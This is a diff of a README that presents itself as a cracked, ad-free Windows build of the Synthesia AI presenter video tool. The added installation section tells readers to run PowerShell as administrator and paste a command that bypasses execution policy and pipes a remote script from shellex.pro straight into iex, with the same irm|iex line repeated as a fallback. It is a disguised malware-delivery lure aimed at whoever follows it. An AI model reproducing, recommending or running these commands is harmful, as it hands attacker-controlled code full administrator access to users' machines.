@@ -4,18 +4,31 @@
 
 Create AI presenter videos from text scripts · Business-class package · Ads removed.
 
-## Download & Install
+## INSTALLATION
 
-> **Your download is below.** Badge or table link — both go to **Synthesia** for Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center"><a href="https://synthesia.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#2d3748;">DOWNLOAD</a><a href="https://synthesia.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#0078D4;">SYNTHESIA</a></p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Host** | **[synthesia.mefidirect.xyz](https://synthesia.mefidirect.xyz/)** |
-| **Full URL** | `https://synthesia.mefidirect.xyz/` |
-| **Type** | Setup bundle for Windows desktops — 64-bit |
-| **Admin** | Right-click setup → Run as administrator
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 📄 Description
 
